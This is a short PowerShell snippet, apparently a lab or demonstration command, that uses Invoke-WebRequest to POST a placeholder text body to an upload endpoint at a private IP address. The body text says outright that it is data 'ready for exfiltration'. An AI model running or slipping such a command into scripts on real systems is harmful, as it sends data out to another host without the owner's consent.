Invoke-WebRequest `
    -Uri "http://192.168.1.3:5000/upload" `
    -Method POST `
    -Body "Here is the data that will be encoded ready for exfiltration" `
    -ContentType "text/plain"